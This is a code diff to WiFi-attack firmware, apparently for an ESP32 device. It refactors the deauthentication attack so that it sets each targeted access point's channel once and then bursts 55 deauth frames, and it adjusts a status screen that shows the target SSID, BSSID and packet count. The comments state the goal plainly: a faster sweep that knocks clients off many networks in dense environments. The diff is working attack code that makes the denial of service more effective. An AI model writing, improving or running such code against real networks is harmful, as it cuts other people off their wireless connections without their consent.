@@ -10113,7 +10113,10 @@ void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
   WiFiScan::set_channel = channel;
   this->changeChannel(channel);
   delay(1);
-  
+  this->sendDeauthFrameOnCurrentChannel(bssid, mac);
+}
+
+void WiFiScan::sendDeauthFrameOnCurrentChannel(uint8_t bssid[6], uint8_t mac[6]) {
   // Build AP source packet
   deauth_frame_default[4] = mac[0];
   deauth_frame_default[5] = mac[1];
@@ -11306,17 +11309,20 @@ void WiFiScan::drawCameraDeauthStatus() {
 // and the running packet count. Display only -- does not touch the TX logic.
 void WiFiScan::drawDeauthStatus() {
   #ifdef HAS_SCREEN
-    // Single pass: count selected APs and capture the one at deauth_view.
+    // Single pass by reference (no AccessPoint/String copies): count selected
+    // APs and capture just the fields of the one at deauth_view. Copying every
+    // AP here would steal time from the attack sweep in a dense environment.
+    const int n = access_points->size();
     int selectedCount = 0;
     String ssid;
     char bssidStr[18] = {0};
     int channel = 0;
     int rssi = 0;
-    for (int i = 0; i < access_points->size(); i++) {
-      AccessPoint ap = access_points->get(i);
+    for (int i = 0; i < n; i++) {
+      AccessPoint& ap = (*access_points)[i];
       if (!ap.selected) continue;
       if (selectedCount == this->deauth_view) {
-        ssid = ap.essid;
+        ssid = ap.essid;  // copy only the one shown
         snprintf(bssidStr, sizeof(bssidStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                  ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
         channel = ap.channel;
@@ -11325,8 +11331,10 @@ void WiFiScan::drawDeauthStatus() {
       selectedCount++;
     }
 
+    // Keep everything in a compact band (y 16..128) so a small clear suffices;
+    // clearing to the bottom of the screen each refresh was needless SPI time.
     display_obj.tft.fillRect(0, 16, TFT_WIDTH, 16, TFT_RED);
-    display_obj.tft.fillRect(0, 32, TFT_WIDTH, TFT_HEIGHT - 32, TFT_BLACK);
+    display_obj.tft.fillRect(0, 32, TFT_WIDTH, 96, TFT_BLACK);
     display_obj.tft.setTextDatum(TC_DATUM);
     display_obj.tft.setTextSize(1);
     display_obj.tft.setTextColor(TFT_WHITE, TFT_RED);
@@ -11337,7 +11345,7 @@ void WiFiScan::drawDeauthStatus() {
       display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
       display_obj.tft.drawString("No APs selected", 2, 40, 1);
       display_obj.tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
-      display_obj.tft.drawString("Touch:stop", 2, TFT_HEIGHT - 12, 1);
+      display_obj.tft.drawString("Touch:stop", 2, 110, 1);
       return;
     }
 
@@ -11345,7 +11353,8 @@ void WiFiScan::drawDeauthStatus() {
     if (ssid.length() > 26) ssid = ssid.substring(0, 25) + "~";
 
     display_obj.tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
-    display_obj.tft.drawString(String("AP ") + (this->deauth_view + 1) + "/" + selectedCount, 2, 36, 1);
+    display_obj.tft.drawString(String("Target ") + (this->deauth_view + 1) + "/" + selectedCount +
+        "  (deauth all)", 2, 36, 1);
     display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
     display_obj.tft.drawString(ssid.length() ? ssid : String("(hidden)"), 2, 50, 1);
     display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
@@ -11355,7 +11364,7 @@ void WiFiScan::drawDeauthStatus() {
     display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
     display_obj.tft.drawString(String("Packets ") + packets_sent, 2, 92, 1);
     display_obj.tft.setTextColor(TFT_LIGHTGREY, TFT_BLACK);
-    display_obj.tft.drawString("Touch:stop", 2, TFT_HEIGHT - 12, 1);
+    display_obj.tft.drawString("Touch:stop", 2, 110, 1);
 
     // Advance to the next selected AP for the next refresh.
     this->deauth_view = (this->deauth_view + 1) % selectedCount;
@@ -13477,17 +13486,27 @@ void WiFiScan::main(uint32_t currentTime)
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
     uint8_t dst_mac_bytes[6];
     convertMacStringToUint8(this->dst_mac, dst_mac_bytes);
-    for (int i = 0; i < access_points->size(); i++) {
-      AccessPoint access_point = access_points->get(i);
+    const int n = access_points->size();
+    for (int i = 0; i < n; i++) {
+      // Reference, not get(): copying each AccessPoint (two Strings) per sweep
+      // scaled with the whole list and slowed the sweep in dense environments.
+      AccessPoint& access_point = (*access_points)[i];
       if (access_point.selected) {
-        for (int i = 0; i < 55; i++) {
-          this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
+        // Set this AP's channel ONCE, then burst frames. Previously every one
+        // of the 55 frames re-selected the channel and did a delay(1) -- with
+        // many APs selected that wasted ~55 ms per AP just re-tuning to the
+        // same channel, so the sweep crawled and barely switched networks.
+        WiFiScan::set_channel = access_point.channel;
+        this->changeChannel(access_point.channel);
+        delay(1);
+        for (int f = 0; f < 55; f++) {
+          this->sendDeauthFrameOnCurrentChannel(access_point.bssid, dst_mac_bytes);
         }
       }
     }
-    // Eternal-style live status (display only; TX logic above is unchanged).
+    // Eternal-style live status (display only; does not gate the TX above).
     if (static_cast<int32_t>(millis() - this->deauth_next_ui) >= 0) {
-      this->deauth_next_ui = millis() + 800;
+      this->deauth_next_ui = millis() + 1000;
       this->drawDeauthStatus();
     }
   }
